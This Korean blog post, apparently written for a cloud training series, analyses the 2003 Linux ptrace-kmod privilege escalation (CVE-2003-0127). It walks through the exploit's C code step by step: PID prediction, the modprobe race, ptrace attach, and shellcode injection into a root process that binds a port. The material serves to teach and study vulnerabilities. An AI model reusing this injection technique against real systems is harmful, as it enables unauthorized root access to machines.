---
layout: post
title: "[KT Cloud TechUp] CVE-2003-0127 ptrace-kmod 커널 익스플로잇 분석: Race Condition을 이용한 권한 상승 공격"
date: 2025-10-15 08:17:48 +0900
categories: velog
series: "kt cloud techup"
---

<p>오래된 취약점이긴 하지만 다음과 같은 개념을 학습할 수 있다.</p>
<ul>
<li>Race Condition 공격</li>
<li>커널 권한 상승 기법</li>
<li>ptrace 시스템 콜 악용</li>
<li>프로세스 메모리 조작</li>
</ul>
<h3 id="취약점-요약">취약점 요약</h3>
<p>공격자 -&gt; AF_SECURITY 소켓 생성 -&gt; 커널이 /sbin/modprobe 실행 (root 권한)
  ↓
ptrace로 modprobe 프로세스에 attach -&gt; 쉘코드 주입 -&gt; root 권한 획득</p>
<h3 id="핵심-원리">핵심 원리</h3>
<ol>
<li>커널 모듈 로딩 메커니즘 악용: AF_SECURITY 소켓 생성 시 커널이 자동으로 root 권한의 modprobe 실행</li>
<li>PID 예측: Linux의 순차적 PID 할당 방식을 이용한 다음 프로세스 PID 예측</li>
<li>Race Condition: 프로세스 생성과 ptrace attach 사이의 타이밍 공격</li>
<li>메모리 조작: ptrace를 통한 root 권한 프로세스의 메모리 조작</li>
</ol>
<h3 id="배경-지식">배경 지식</h3>
<p>*<em>1. ptrace 시스템 콜
*</em>- ptrace는 process trace의 줄임말로, 한 프로세스가 다른 프로세스를 디버깅하고 제어할 수 있게 해 주는 시스템 콜</p>
<pre><code>#include &lt;sys/ptrace.h&gt;

long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);</code></pre><ul>
<li>주요 ptrace 옵션<ul>
<li>PTRACE_ATTACH: 대상 프로세스에 디버거로 연결</li>
<li>PTRACE_DETACH: 디버깅 연결 해제</li>
<li>PTRACE_GETREGS: 레지스터 값 읽기</li>
<li>PTRACE_SETREGS: 레지스터 값 설정</li>
<li>PTRACE_PEEKTEXT: 메모리 읽기</li>
<li>PTRACE_POKETEXT: 메모리 쓰기</li>
<li>PTRACE_SYSCALL: 시스템 콜 진입/종료 시점에서 중단</li>
</ul>
</li>
<li>ptrace의 일반적인 사용 예시<pre><code>// gdb와 같은 디버거의 기본 동작
pid_t child_pid = fork();
if (child_pid == 0) {
  // 자식 프로세스: 디버깅 대상
  ptrace(PTRACE_TRACEME, 0, NULL, NULL);
  execl("/bin/ls", "ls", NULL);
} else {
  // 부모 프로세스: 디버거
  int status;
  wait(&amp;status);  // 자식 프로세스가 멈출 때까지 대기
  ptrace(PTRACE_CONT, child_pid, NULL, NULL);  // 실행 재개
}</code></pre></li>
</ul>
<p>*<em>2. fork() 시스템 콜과 프로세스 생성
*</em>```
#include &lt;unistd.h&gt;</p>
<p>pid_t fork(void);</p>
<pre><code>fork()의 특징:    
    - 한 번 호출, 두 번 리턴 (부모와 자식 프로세스에서 각각)
    - 부모 프로세스: 자식의 PID값 리턴
    - 자식 프로세스: 0 리턴 (실패시 -1)

**3. Linux PID 할당 메커니즘 (2003년 당시의 PID 할당 방식)
**```
// 단순화된 PID 할당 알고리즘 (당시)
static int last_pid = 0;

int get_next_pid(void) {
    do {
        last_pid++;
        if (last_pid &gt;= PID_MAX)  // 보통 32768
            last_pid = 1;
    } while (pid_in_use(last_pid));

    return last_pid;
}</code></pre><p>순차적 할당 방식을 사용 =&gt; 다음 프로세스의 pid를 예측할 수 있었음</p>
<p><strong>4. UID/GID와 권한 시스템</strong></p>
<ul>
<li>사용자 ID의 종류<ul>
<li>Real UID (ruid): 실제 사용자 ID</li>
<li>Effective UID (euid): 현재 유효한 권한 ID</li>
<li>Saved UID (suid): 저장된 사용자 ID</li>
</ul>
</li>
<li>권한 상승의 핵심: 시스템에서 권한 검사는 주로 EUID를 기준으로 함</li>
</ul>
<h3 id="취약점-분석">취약점 분석</h3>
<p><strong>근본 원인 분석</strong></p>
<ol>
<li>커널 모듈 자동 로딩 메커니즘: 리눅스 커널은 필요한 기능이 요청될 때 자동으로 해당 모듈을 로드함</li>
<li>modprobe의 특권 실행: /sbin/modprobe는 커널 모듈을 로드하기 위해 root 권한 (euid=0)으로 실행됨</li>
<li>ptrace 권한 검사 미흡</li>
</ol>
<h3 id="race-condition">Race Condition</h3>
<p>시간축 →
부모 프로세스: socket() ──────────────────────→ 종료
               │
               └→ 커널: modprobe 실행 ──→ modprobe 초기화 ──→ 시스템콜
                                        │
자식 프로세스: ────────── ptrace_attach() ──┘</p>
<p>Time 0: socket(AF_SECURITY, ...) 호출
Time 1: 커널이 modprobe 프로세스 생성 (PID 할당)
Time 2: modprobe 프로세스 초기화 시작
Time 3: [RACE WINDOW] - ptrace attach 가능!
Time 4: modprobe가 모듈 로딩 완료
Time 5: modprobe 종료</p>
<h3 id="공격-시나리오-분석">공격 시나리오 분석</h3>
<p>Phase 1: 프로세스 분기 및 초기 설정</p>
<pre><code>// 부모 프로세스 PID 저장
parent = getpid();

// 프로세스 분기
switch (pid = fork()) {

결과
프로세스 생성:
├── 부모 프로세스 (PID: 1000) - 취약점 트리거 담당
└── 자식 프로세스 (PID: 1001) - 공격 로직 담당</code></pre><p>Phase 2: 자식 프로세스 - PID 예측 및 대기 설정</p>
<pre><code>case 0:  // 자식 프로세스
    child = getpid();         // 현재 PID (1001)
    k_child = child + 1;      // 예측 PID (1002)

    fprintf(stderr, "-&gt; Parent's PID is %d. Child's PID is %d.\n", 
            parent, child);
    fprintf(stderr, "-&gt; Attaching to %d...", k_child);

    // 시그널 핸들러 설정
    signal(SIGCHLD, sigchld);
    signal(SIGALRM, sigalrm);
    alarm(10);  // 10초 타임아웃</code></pre><p>Phase 3: 부모 프로세스 - 취약점 트리거</p>
<pre><code>default:  // 부모 프로세스
    signal(SIGALRM, sigalrm);
    alarm(10);

    // 핵심! AF_SECURITY 소켓 생성으로 modprobe 실행 유도
    socket(AF_SECURITY, SOCK_STREAM, 1);
    break;</code></pre><p>시스템 반응: # 커널이 자동으로 실행하는 명령 /sbin/modprobe -s -k net-pf-14
프로세스 상태:
PID  USER     COMMAND
1000 user     ./exploit          (부모)
1001 user     ./exploit          (자식)<br/>1002 root     /sbin/modprobe -s -k net-pf-14  ← 공격 대상!</p>
<p>Phase 4: ptrace Attach 시도</p>
<pre><code>// 무한 루프로 attach 시도
while ((error = ptrace(PTRACE_ATTACH, k_child, 0, 0) == -1) &amp;&amp; 
       (errno == ESRCH)) {
    fprintf(stderr, ".");
}

if (error == -1) {
    fprintf(stderr, "-&gt; Unable to attach to %d.\n", k_child);
    exit(0);
}

fprintf(stderr, "\n-&gt; Got the thread!!\n");</code></pre><ul>
<li>상세한 동작:<ul>
<li>PTRACE_ATTACH로 PID 1002에 연결 시도</li>
<li>ESRCH 에러: "No such process" - 아직 프로세스가 생성되지 않음</li>
<li>반복적으로 시도하다가 성공하면 "Got the thread!!" 출력</li>
</ul>
</li>
<li>성공 시 효과:<ul>
<li>modprobe 프로세스가 SIGSTOP 시그널을 받고 정지</li>
<li>자식 프로세스가 SIGCHLD 시그널을 받음 (sigc 증가)</li>
</ul>
</li>
</ul>
<p>Phase 5: 시스템콜 추적 설정</p>
<pre><code>// SIGCHLD 시그널 대기 (ptrace attach 성공 확인)
while(sigc &lt; 1);

// 시스템콜 추적 모드 설정
if (ptrace(PTRACE_SYSCALL, k_child, 0, 0) == -1) {
    fprintf(stderr, "-&gt; Unable to setup syscall trace.\n");
    exit(0);
}

fprintf(stderr, "-&gt; Waiting for the next signal...\n");

// 다음 시그널까지 대기 (시스템콜 진입점)
while(sigc &lt; 2);</code></pre><ul>
<li>PTRACE_SYSCALL의 효과:<ul>
<li>대상 프로세스가 시스템콜 진입/종료 시마다 정지</li>
<li>각 정지마다 SIGCHLD 시그널 발생</li>
</ul>
</li>
</ul>
<p>Phase 6: 레지스터 읽기 및 쉘코드 주입</p>
<pre><code>// CPU 레지스터 값 읽기
if (ptrace(PTRACE_GETREGS, k_child, NULL, &amp;regs) == -1) {
    perror("-&gt; Unable to read registers: ");
}

fprintf(stderr, "-&gt; Injecting shellcode at 0x%08x\n", regs.eip);

// EIP 주소에 쉘코드 주입
for (i = 0; i &lt;= SIZE; i += 4) {
    if (ptrace(PTRACE_POKETEXT, k_child, regs.eip + i, 
               *(int*)(shellcode + i))) {
        // 오류 처리 생략
    }
}</code></pre><p>원본 메모리:           변조된 메모리:
┌─────────────┐       ┌─────────────┐
│ 0x08048000  │  →    │  쉘코드     │ ← EIP
│ modprobe    │       │  (24876번   │
│ 기존 코드   │       │   포트      │<br/>│             │       │   바인딩)   │
└─────────────┘       └─────────────┘</p>